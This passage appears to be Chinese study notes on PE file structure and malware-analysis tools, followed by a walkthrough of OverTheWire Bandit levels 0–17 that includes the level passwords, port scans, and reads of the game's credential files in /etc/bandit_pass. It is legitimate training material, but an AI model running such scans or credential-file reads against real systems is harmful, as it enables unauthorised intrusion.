<p>工具：<code>strings</code></p>
<p>strings会忽略上下文和格式，从整个文件中检测出可打印字符串。</p>
<h3 id="unicode编码"><a class="header" href="#unicode编码">unicode编码</a></h3>
<p>这里需要知道unicode和ascii的区别
<img src="MalwareAnalysis/knowledge/image.png" alt="unicode" /></p>
<h2 id="加壳"><a class="header" href="#加壳">加壳</a></h2>
<p>加壳用来防止恶意代码被轻易分析出来。
<img src="MalwareAnalysis/knowledge/image-1.png" alt="加壳" /></p>
<p><strong>加壳和混淆代码通常包含 <code>LoadLibrary</code>和<code>GetProcAddress</code>函数，用来加载和使用其他函数功能</strong></p>
<h3 id="检测"><a class="header" href="#检测">检测</a></h3>
<p>工具：<code>PEiD</code></p>
<p>2011年停止支持，不知道有没有新的工具。</p>
<h2 id="pe文件格式"><a class="header" href="#pe文件格式">PE文件格式</a></h2>
<p><em>本段内容由网络知识搜索而成，因为PE文件非常重要，书上这一点讲得太少！</em></p>
<h3 id="基本介绍"><a class="header" href="#基本介绍">基本介绍</a></h3>
<p>PE文件是Windows操作系统下使用的一种可执行文件，由COFF（UNIX平台下的通用对象文件格式）格式。</p>
<p>PE是“Portable Executable File Format”（可移植的执行体）的缩写。</p>
<p>PE文件是指 32 位可执行文件，也称为PE32。64位的可执行文件称为 PE+ 或 PE32+，是PE(PE32)的一种扩展形式（请注意不是PE64)，没有新的结构加入，只是简单地将以前32位字段扩展成64位。对于C++代码，Windows文件头的配置使其拥有不明显的区别。
事实上，一个文件是否是 PE 文件与其扩展名无关，EXE文件和DLL文件的区别完全是语义上的。它们使用完全相同的PE格式，唯一的区别就是用一个字段标识出这个文件是EXE还是DLL。</p>
<h3 id="种类"><a class="header" href="#种类">种类</a></h3>
<div class="table-wrapper"><table><thead><tr><th>种类</th><th>主扩展名</th></tr></thead><tbody>
<tr><td>可执行系列</td><td>EXE, SCR</td></tr>
<tr><td>库系列</td><td>DLL, OCX, CPL, DRV</td></tr>
<tr><td>驱动程序系列</td><td>SYS, VXD</td></tr>
<tr><td>对象文件系列</td><td>OBJ</td></tr>
</tbody></table>
</div>
<h3 id="基本形式"><a class="header" href="#基本形式">基本形式</a></h3>
<p>PE文件使用的是一个平面地址空间，所有代码和数据都被合并在一起，组成一个很大的结构。文件的内容被分割为不同的区块（Section，又称区段、节等），区块中包含代码或数据，各个区块按页边界来对齐，区块没有大小限制，是一个连续结构。每个块都有它自己在内存中的一套属性，比如：这个块是否包含代码、是否只读或可读/写等。</p>
<h3 id="具体结构"><a class="header" href="#具体结构">具体结构</a></h3>
<p><img src="MalwareAnalysis/knowledge/image-2.png" alt="PE文件结构" /></p>
<ol>
<li>DOS头 是用来兼容 MS-DOS 操作系统的，目的是当这个文件在 MS-DOS 上运行时提示一段文字，大部分情况下是：This program cannot be run in DOS mode. 还有一个目的，就是指明 NT 头在文件中的位置。</li>
<li>NT头 包含 windows PE 文件的主要信息，其中包括一个 ‘PE’ 字样的签名，PE文件头（IMAGE_FILE_HEADER）和 PE可选头（IMAGE_OPTIONAL_HEADER32）。</li>
<li>节表：是 PE 文件后续节的描述，windows 根据节表的描述加载每个节。</li>
<li>节：每个节实际上是一个容器，可以包含 代码、数据 等等，每个节可以有独立的内存权限，比如代码节默认有读/执行权限，节的名字和数量可以自己定义，未必是上图中的三个。</li>
</ol>
<h3 id="rva-va"><a class="header" href="#rva-va">RVA VA</a></h3>
<p>相对虚拟地址RVA与虚拟地址VA
&gt;当一个 PE 文件被加载到内存中以后，我们称之为 “ 映象 “（image），一般来说，PE文件在硬盘上和在内存里是不完全一样的，被加载到内存以后其占用的虚拟地址空间要比在硬盘上占用的空间大一些，这是因为各个节在硬盘上是连续的，而在内存中是按页对齐的，所以加载到内存以后节之间会出现一些 “空洞” 。</p>
<p>因为存在这种对齐，所以在 PE 结构内部，表示某个位置的地址采用了两种方式：</p>
<p>针对在硬盘上存储文件中的地址，称为 原始存储地址 或 物理地址，表示 距离文件头的偏移。
针对加载到内存以后映象中的地址，称为 相对虚拟地址（RVA），表示相对内存映象头的偏移。</p>
<p><strong>这里需要知道的是RVA=VA-ImageBase</strong></p>
<h3 id="结构"><a class="header" href="#结构">结构</a></h3>
<h4 id="dos头"><a class="header" href="#dos头">DOS头</a></h4>
<p>由MZ头和DOS存根组成</p>
<p><code>MZ</code>头部是真正的DOS头部，由于其开始处的两个字节为“MZ”，因此DOS头也可以叫作MZ头。该部分用于程序在DOS系统下加载，它的结构被定义为IMAGE_DOS_HEADER。</p>
<p>其中，值得注意的是e_magic字段和e_lfanew字段
e_magic字段占两个字节，值为<code>0x5A4D</code>，对应ASCII码值为<code>'MZ'</code>，“MZ“其实是MS-DOS的创建者之一Mark Zbikowski名字的缩写。</p>
<p>e_lfanew字段占4个字节，位于从文件开始偏移<code>3Ch</code>字节处，用于指出NT头的偏移地址</p>
<pre><code class="language-C">typedef struct _IMAGE_DOS_HEADER {
    WORD e_magic; //魔术数字
    WORD e_cblp;  //文件最后页的字节数
    WORD e_cp;    //文件页数
    WORD e_crlc;  //重定义元素个数
    WORD e_cparhdr;  //头部尺寸，以段落为单位
    WORD e_minalloc; //所需的最小附加段
    WORD e_maxalloc; //所需的最大附加段
    WORD e_ss;    //初始的SS值（相对偏移量）
    WORD e_sp;    //初始的SP值
    WORD e_csum;  //校验和
    WORD e_ip;    //初始的IP值
    WORD e_cs;    //初始的CS值（相对偏移量）
    WORD e_lfarlc; //重分配表文件地址
    WORD e_ovno;   //覆盖号
    WORD e_res[4]; //保留字
    WORD e_oemid;  //OEM标识符（相对e_oeminfo）
    WORD e_oeminfo;  //OEM信息
    WORD e_res2[10]; //保留字
    LONG e_lfanew;   //新exe头部的文件位置
} IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER;

</code></pre>
<h4 id="nt头"><a class="header" href="#nt头">NT头</a></h4>
<p>PE最重要的头，由 DOS 头中的 e_lfanew 决定 ，表示 DOS头之后的 NT头相对文件起始地址的偏移</p>
<p>巨恶心的一大坨东西。</p>
<p>这一块儿最重要的是导入表、导出表、资源目录等。</p>
<p><em>这里日后用到了再写，这一坨是真的恶心</em></p>
<h4 id="节表"><a class="header" href="#节表">节表</a></h4>
<p>节表Section Table是一个结构数组，每个元素都是一个IMAGE_SECTION_HEADER结构，包含了对应节的属性、文件偏移量、虚拟偏移量等。</p>
<pre><code class="language-C">typedef struct _IMAGE_SECTION_HEADER {
    +000h    BYTE Name[8]; //节名称，如&quot;.text&quot;
    union {
        +008h    DWORD               PhysicalAddress;      // 物理地址
        +008h    DWORD               VirtualSize;          // 节长度
    } Misc;
    +00Ch    DWORD               VirtualAddress;       // RVA
    +010h    DWORD               SizeOfRawData;        // 对齐后的节尺寸
    +014h    DWORD               PointerToRawData;     // 基于文件的偏移
    +018h    DWORD               PointerToRelocations; // 重定位的偏移
    +01Ch    DWORD               PointerToLinenumbers; // 行号表的偏移
    +020h    WORD                NumberOfRelocations;  // 重定位项数目
    +022h    WORD                NumberOfLinenumbers;  // 行号表中行号数目
    +024h    DWORD               Characteristics;      // 节属性
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
</code></pre>
<h3 id="pe-文件的执行顺序"><a class="header" href="#pe-文件的执行顺序">PE 文件的执行顺序</a></h3>
<ol>
<li>当一个 PE 文件 被执行时，PE 装载器 首先检查 DOS header 里的 PE header 的偏移量。如果找到，则直接跳转到 PE header 的位置。
当 PE装载器 跳转到 PE header 后，第二步要做的就是2. 检查 PE header 是否有效。如果该 PE header 有效，就跳转到 PE header 的尾部。</li>
<li>紧跟 PE header 尾部的是节表。PE装载器执行完第二步后开始读取节表中的节段信息，并采用文件映射（ 在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射的机制，也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系，只有真正执行到某个内存页中的指令或者访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大的关系 ）的方法将这些节段映射到内存，同时附上节表里指定节段的读写属性。</li>
<li>PE文件映射入内存后，PE装载器将继续处理PE文件中类似 import table （输入表）的逻辑部分。</li>
</ol>
<h3 id="ref-5"><a class="header" href="#ref-5">ref</a></h3>
<ul>
<li><a href="https://www.cnblogs.com/cyx-b/p/13485664.html">博客</a></li>
<li><a href="https://blog.csdn.net/freeking101/article/details/102752048">这个很细，建议和上面那个结合看</a></li>
<li><a href="https://liwz11.com/blog/archives/404.html">这个很清楚，有简要的要点</a></li>
</ul>
<h2 id="dependency-walker"><a class="header" href="#dependency-walker">Dependency Walker</a></h2>
<p>是个工具，探索动态链接函数的。</p>
<h3 id="常见的dll"><a class="header" href="#常见的dll">常见的DLL</a></h3>
<p><img src="MalwareAnalysis/knowledge/image-3.png" alt="常见的DLL程序" /></p>
<h3 id="函数命名约定"><a class="header" href="#函数命名约定">函数命名约定</a></h3>
<p>Ex,是微软在更新新函数和旧函数不兼容时加入的东西。</p>
<p>而A和W结尾是指接受参数分别是ascii和unicode</p>
<h3 id="导入导出"><a class="header" href="#导入导出">导入导出</a></h3>
<p>需要自己熟悉一些windows函数</p>
<h3 id="peview"><a class="header" href="#peview">PEview</a></h3>
<p>工具，查看PE文件格式的</p>
<h3 id="resource-hacker"><a class="header" href="#resource-hacker">Resource Hacker</a></h3>
<p>工具，查看资源节</p>
<h3 id="其他工具"><a class="header" href="#其他工具">其他工具</a></h3>
<p>PEBrowse Professional</p>
<p>PE Explorer</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="about-lab"><a class="header" href="#about-lab">About Lab</a></h1>
<p>存放了很多实验报告</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="wargame-1"><a class="header" href="#wargame-1">WarGame</a></h1>
<p>一个十分优秀的免费靶场，非常适合新手入门或者高手休闲娱乐。</p>
<div style="break-before: page; page-break-before: always;"></div><p>OverTheWire社区是一个提供wargame的网站，可以帮助安全爱好者以趣味的方式进行学习、练习安全知识。</p>
<p><a href="https://overthewire.org/wargames/bandit/">bandit，熟悉linux和bash的有趣的网站</a></p>
<h1 id="level0-ssh远程登录"><a class="header" href="#level0-ssh远程登录">level0 ssh远程登录</a></h1>
<pre><code>ssh bandit0@bandit.labs.overthewire.org -p 2220
# 然后输入密码即可
</code></pre>
<p><img src="WarGame/image.png" alt="level0" />
顺利拿到提示符</p>
<h1 id="level1-3"><a class="header" href="#level1-3">level1</a></h1>
<p>要求使用cat命令，水</p>
<pre><code>bandit0@bandit:~$ ll
total 24
drwxr-xr-x  2 root    root    4096 Apr 23 18:04 ./
drwxr-xr-x 70 root    root    4096 Apr 23 18:05 ../
-rw-r--r--  1 root    root     220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root    root    3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root    root     807 Jan  6  2022 .profile
-rw-r-----  1 bandit1 bandit0   33 Apr 23 18:04 readme
bandit0@bandit:~$ cat readme
NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
bandit0@bandit:~$
</code></pre>
<h1 id="level2-3"><a class="header" href="#level2-3">level2</a></h1>
<p>处理名字叫“-”的文件，这个由于会和参数解析混了，我的处理办法是加上“./”</p>
<pre><code>bandit1@bandit:~$ ll
total 24
-rw-r-----  1 bandit2 bandit1   33 Apr 23 18:04 -
drwxr-xr-x  2 root    root    4096 Apr 23 18:04 ./
drwxr-xr-x 70 root    root    4096 Apr 23 18:05 ../
-rw-r--r--  1 root    root     220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root    root    3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root    root     807 Jan  6  2022 .profile
bandit1@bandit:~$ cat ./-
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
bandit1@bandit:~$
</code></pre>
<h1 id="level3-2"><a class="header" href="#level3-2">level3</a></h1>
<p>处理名字里有空格的文件，直接拿双引号包起来即可</p>
<pre><code>bandit2@bandit:~$ ll
total 24
drwxr-xr-x  2 root    root    4096 Apr 23 18:04 ./
drwxr-xr-x 70 root    root    4096 Apr 23 18:05 ../
-rw-r--r--  1 root    root     220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root    root    3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root    root     807 Jan  6  2022 .profile
-rw-r-----  1 bandit3 bandit2   33 Apr 23 18:04 spaces in this filename
bandit2@bandit:~$ cat &quot;spaces in this filename&quot;
aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
bandit2@bandit:~$
</code></pre>
<h1 id="level4-2"><a class="header" href="#level4-2">level4</a></h1>
<p>处理文件夹，正确的方式应该是cd进去再处理，因为在这个阶段还不涉及绝对路径、相对路径之类的概念，但是我懒了</p>
<p>另外，还有个处理隐藏文件，可以使用ls -l命令，在大多数bash中会把ls -al写成别名ll</p>
<p>也可以使用ls -a</p>
<pre><code>bandit3@bandit:~$ ll
total 24
drwxr-xr-x  3 root root 4096 Apr 23 18:04 ./
drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../
-rw-r--r--  1 root root  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root root 3771 Jan  6  2022 .bashrc
drwxr-xr-x  2 root root 4096 Apr 23 18:04 inhere/
-rw-r--r--  1 root root  807 Jan  6  2022 .profile
bandit3@bandit:~$ ls inhere/
bandit3@bandit:~$ ll inhere/
total 12
drwxr-xr-x 2 root    root    4096 Apr 23 18:04 ./
drwxr-xr-x 3 root    root    4096 Apr 23 18:04 ../
-rw-r----- 1 bandit4 bandit3   33 Apr 23 18:04 .hidden
bandit3@bandit:~$ cat ./inhere/.hidden
2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
bandit3@bandit:~$
</code></pre>
<h1 id="level5-2"><a class="header" href="#level5-2">level5</a></h1>
<pre><code>bandit4@bandit:~$ ls
inhere
bandit4@bandit:~$ cd inhere/
bandit4@bandit:~/inhere$ ll
total 48
drwxr-xr-x 2 root    root    4096 Apr 23 18:04 ./
drwxr-xr-x 3 root    root    4096 Apr 23 18:04 ../
-rw-r----- 1 bandit5 bandit4   33 Apr 23 18:04 -file00
-rw-r----- 1 bandit5 bandit4   33 Apr 23 18:04 -file01
-rw-r----- 1 bandit5 bandit4   33 Apr 23 18:04 -file02
-rw-r----- 1 bandit5 bandit4   33 Apr 23 18:04 -file03
-rw-r----- 1 bandit5 bandit4   33 Apr 23 18:04 -file04
-rw-r----- 1 bandit5 bandit4   33 Apr 23 18:04 -file05
-rw-r----- 1 bandit5 bandit4   33 Apr 23 18:04 -file06
-rw-r----- 1 bandit5 bandit4   33 Apr 23 18:04 -file07
-rw-r----- 1 bandit5 bandit4   33 Apr 23 18:04 -file08
-rw-r----- 1 bandit5 bandit4   33 Apr 23 18:04 -file09
bandit4@bandit:~/inhere$ cat ./-file06
'�wk^j��M�;,�co9bandit4@bandit:~/inhere$
# 使用reset后
bandit4@bandit:~/inhere$ cat ./-file07
lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
bandit4@bandit:~/inhere$
</code></pre>
<p><a href="https://blog.csdn.net/tsummer2010/article/details/105374173">这里</a>有一个讲了reset和clear的区别，很简单</p>
<h1 id="level6-2"><a class="header" href="#level6-2">level6</a></h1>
<p>挺麻烦的一个鸡儿题</p>
<pre><code>bandit5@bandit:~/inhere$ cd maybehere07
bandit5@bandit:~/inhere/maybehere07$ ll
total 56
drwxr-x---  2 root bandit5 4096 Apr 23 18:04 ./
drwxr-x--- 22 root bandit5 4096 Apr 23 18:04 ../
-rwxr-x---  1 root bandit5 3663 Apr 23 18:04 -file1*
-rwxr-x---  1 root bandit5 3065 Apr 23 18:04 .file1*
-rw-r-----  1 root bandit5 2488 Apr 23 18:04 -file2
-rw-r-----  1 root bandit5 1033 Apr 23 18:04 .file2
-rwxr-x---  1 root bandit5 3362 Apr 23 18:04 -file3*
-rwxr-x---  1 root bandit5 1997 Apr 23 18:04 .file3*
-rwxr-x---  1 root bandit5 4130 Apr 23 18:04 spaces file1*
-rw-r-----  1 root bandit5 9064 Apr 23 18:04 spaces file2
-rwxr-x---  1 root bandit5 1022 Apr 23 18:04 spaces file3*
bandit5@bandit:~/inhere/maybehere07$ cat .file2
P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
</code></pre>
<p>这里需要知道ll输出的这一大堆都是啥玩意儿，rwx分别代表可读可写可执行，剩下的看文档吧。</p>
<h1 id="level7-2"><a class="header" href="#level7-2">level7</a></h1>
<p>要使用find了</p>
<pre><code># 我cd到根目录也没怎么发现，因此直接find搜索了，还挺快的，按理说linux自带这些破玩意儿不该这么快的。。。
bandit6@bandit:/$ find / -type f -size 33c -user bandit7 -group bandit6 2&gt;/dev/null
/var/lib/dpkg/info/bandit7.password
bandit6@bandit:/$ cat /var/lib/dpkg/info/bandit7.password
z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
</code></pre>
<p>那个斜杠是指定为根目录，然后就是大小、用户、组，最后有一个标准错误重定向到黑洞，不写也没事儿，我习惯了</p>
<h1 id="level8-2"><a class="header" href="#level8-2">level8</a></h1>
<p>这个就是grep</p>
<pre><code>bandit7@bandit:~$ find / -type f -name &quot;data.txt&quot; -exec grep -l &quot;million&quot; {} \; 2&gt;/dev/null
/home/bandit7/data.txt
bandit7@bandit:~$ grep &quot;millionth&quot; data.txt
millionth	TESKZC0XvTetK0S9xNwm25STk5iWrBvP
</code></pre>
<p>其实另一个办法是打开文件然后用vim的搜索，我试了试也挺快的</p>
<h1 id="level9-2"><a class="header" href="#level9-2">level9</a></h1>
<p>用一下sort即可</p>
<pre><code>bandit8@bandit:~$ ll
total 56
drwxr-xr-x  2 root    root     4096 Apr 23 18:04 ./
drwxr-xr-x 70 root    root     4096 Apr 23 18:05 ../
-rw-r--r--  1 root    root      220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root    root     3771 Jan  6  2022 .bashrc
-rw-r-----  1 bandit9 bandit8 33033 Apr 23 18:04 data.txt
-rw-r--r--  1 root    root      807 Jan  6  2022 .profile
bandit8@bandit:~$ sort data.txt | uniq -c | sort -n | head -n1
      1 EN632PlfYiZbn3PhVK3XOGSlNInNE00t
bandit8@bandit:~$
</code></pre>
<h1 id="level10-2"><a class="header" href="#level10-2">level10</a></h1>
<p>好像是正则，我不太会，草草写了些</p>
<pre><code>bandit9@bandit:~$ strings data.txt | grep -oE &quot;==.*&quot;
========== the#
========== password
========== is
========== G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
bandit9@bandit:~$
</code></pre>
<h1 id="level11-2"><a class="header" href="#level11-2">level11</a></h1>
<p>base64解码</p>
<pre><code>bandit10@bandit:~$ cat data.txt | base64 -d
The password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
bandit10@bandit:~$
</code></pre>
<h1 id="level12-2"><a class="header" href="#level12-2">level12</a></h1>
<p>使用tr</p>
<p><em>万幸查了一下，差点儿写个脚本。。。</em></p>
<pre><code>bandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'
The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
</code></pre>
<h1 id="level13-2"><a class="header" href="#level13-2">level13</a></h1>
<p>有点儿复杂啊，问的chatgpt然后才会的</p>
<pre><code># 先mkdir然后cp
bandit12@bandit:~$ cd /tmp/myname123
bandit12@bandit:/tmp/myname123$ xxd -r /tmp/myname123/data.txt &gt; /tmp/myname123/data.bin
bandit12@bandit:/tmp/myname123$ file /tmp/myname123/data.bin
/tmp/myname123/data.bin: gzip compressed data, was &quot;data2.bin&quot;, last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 581
bandit12@bandit:/tmp/myname123$ gzip -d -S .bin /tmp/myname123/data.bin
bandit12@bandit:/tmp/myname123$ ll
total 10628
drwxrwxr-x    2 bandit12 bandit12     4096 Jul 17 03:01 ./
drwxrwx-wt 3791 root     root     10801152 Jul 17 03:03 ../
-rw-rw-r--    1 bandit12 bandit12        0 Jul 17 02:39 bandit
-rw-rw-r--    1 bandit12 bandit12      581 Jul 17 02:59 data
-rw-rw-r--    1 bandit12 bandit12    20480 Jul 16 19:05 data5.tar
-rw-r--r--    1 bandit12 bandit12    10240 Apr 23 18:04 data6.tar
-rw-r--r--    1 bandit12 bandit12    10240 Apr 23 18:04 data8.tar
-rw-r--r--    1 bandit12 bandit12       49 Apr 23 18:04 data9
-rw-rw-r--    1 bandit12 bandit12      581 Jul 16 15:25 data.bz2
-rw-r-----    1 bandit12 bandit12     2642 Jul 16 19:00 data.hex
-rw-r-----    1 bandit12 bandit12     2642 Jul 17 02:50 data.txt
-rw-r-----    1 bandit12 bandit12     2642 Jul 17 02:34 mydata.txt
bandit12@bandit:/tmp/myname123$ cat data9
The password is wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
bandit12@bandit:/tmp/myname123$
</code></pre>
<h1 id="level14-2"><a class="header" href="#level14-2">level14</a></h1>
<p>水，用私钥登录</p>
<pre><code>bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost -p 2220
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit13/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts).
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

!!! You are trying to log into this SSH server with a password on port 2220 from localhost.
!!! Connecting from localhost is blocked to conserve resources.
!!! Please log out and log in again.


      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--&quot;
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---&quot; ire.org


Welcome to OverTheWire!

If you find any problems, please report them to the #wargames channel on
discord or IRC.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing &quot;somegame&quot;, then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command &quot;mktemp -d&quot; in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
  restricted so that users cannot snoop on eachother. Files and directories
  with easily guessable or short names will be periodically deleted! The /tmp
  directory is regularly wiped.
  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few useful tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * peda (https://github.com/longld/peda.git) in /opt/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

 Both python2 and python3 are installed.

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

bandit14@bandit:~$
</code></pre>
<h1 id="level15-2"><a class="header" href="#level15-2">level15</a></h1>
<p>nc这个命令在复杂情况下需要自己写http请求的内容，挺离谱的，还是curl和python方便</p>
<p>一些学习的链接<a href="https://juejin.cn/post/6995203632387866631">https://juejin.cn/post/6995203632387866631</a>、<a href="https://www.runoob.com/linux/linux-comm-nc.html">https://www.runoob.com/linux/linux-comm-nc.html</a>，更多内容可以参考CSE365 sp23的<code>talking web</code>模块。</p>
<pre><code>bandit14@bandit:/etc/bandit_pass$ cat bandit14
fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
bandit14@bandit:/etc/bandit_pass$ cat bandit14 | nc localhost 30000
Correct!
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt

bandit14@bandit:/etc/bandit_pass$
</code></pre>
<h1 id="level16-2"><a class="header" href="#level16-2">level16</a></h1>
<pre><code>bandit14@bandit:echo &quot;jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt&quot; | openssl s_client -connect localhost:30001 -ign_eof
Correct!
JQttfApK4SeyHwDlI9SXGR50qclOAil1

closed
</code></pre>
<h1 id="level17-2"><a class="header" href="#level17-2">level17</a></h1>
<pre><code>bandit16@bandit:~$ nmap -sV localhost -T5 -p 31000-32000
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-17 04:20 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00015s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE     VERSION
31046/tcp open  echo
31518/tcp open  ssl/echo
31691/tcp open  echo
31790/tcp open  ssl/unknown
31960/tcp open  echo
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31790-TCP:V=7.80%T=SSL%I=7%D=7/17%Time=64B4C185%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x20cu
SF:rrent\x20password\n&quot;)%r(GetRequest,31,&quot;Wrong!\x20Please\x20enter\x20the
SF:\x20correct\x20current\x20password\n&quot;)%r(HTTPOptions,31,&quot;Wrong!\x20Plea
SF:se\x20enter\x20the\x20correct\x20current\x20password\n&quot;)%r(RTSPRequest,
SF:31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20password\
SF:n&quot;)%r(Help,31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x
SF:20password\n&quot;)%r(SSLSessionReq,31,&quot;Wrong!\x20Please\x20enter\x20the\x20
SF:correct\x20current\x20password\n&quot;)%r(TerminalServerCookie,31,&quot;Wrong!\x2
SF:0Please\x20enter\x20the\x20correct\x20current\x20password\n&quot;)%r(TLSSess
SF:ionReq,31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20pa
SF:ssword\n&quot;)%r(Kerberos,31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x
SF:20current\x20password\n&quot;)%r(FourOhFourRequest,31,&quot;Wrong!\x20Please\x20e
SF:nter\x20the\x20correct\x20current\x20password\n&quot;)%r(LPDString,31,&quot;Wrong
SF:!\x20Please\x20enter\x20the\x20correct\x20current\x20password\n&quot;)%r(LDA
SF:PSearchReq,31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x
SF:20password\n&quot;)%r(SIPOptions,31,&quot;Wrong!\x20Please\x20enter\x20the\x20cor
SF:rect\x20current\x20password\n&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.85 seconds
</code></pre>
<p>然后，要输入16的密码</p>
<pre><code>bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = localhost
verify error:num=10:certificate has expired
notAfter=Jul 17 03:32:59 2023 GMT
verify return:1
depth=0 CN = localhost
notAfter=Jul 17 03:32:59 2023 GMT
verify return:1
---
Certificate chain
 0 s:CN = localhost
   i:CN = localhost
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1
   v:NotBefore: Jul 17 03:31:59 2023 GMT; NotAfter: Jul 17 03:32:59 2023 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIDCzCCAfOgAwIBAgIEasML0jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
b2NhbGhvc3QwHhcNMjMwNzE3MDMzMTU5WhcNMjMwNzE3MDMzMjU5WjAUMRIwEAYD
VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ
WpK5aICLya01rGDXaLVwQpZqWmn75BPH3O2vrqMAu14iXbKtemseBnOaB3vSfu04
QNfWLYWKrnab4hd73/TOurIHq33MnsH8Yb+lzx6VfBq/FouTviT2QBE5cVlvQV63
QPjJZ4mBomudPpDXLfbHWxsH8BYxa6lSqBjs8EqOnfEL9SRoQ+H0w66NjpOnGtLO
l0oYAbmriOkmOht1tr1hoxiacNZa9WEOq01SNrIRGbhOPw07c7/rVXfz9dDBrhPQ
D7FpX/UDyZvJFM3I+sTpwoUj7Ypzvhim+kVY9lGRnzuy439yGovgURCiNwlXUpDA
/Kr/hRCriC3URJT4mWKdAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL
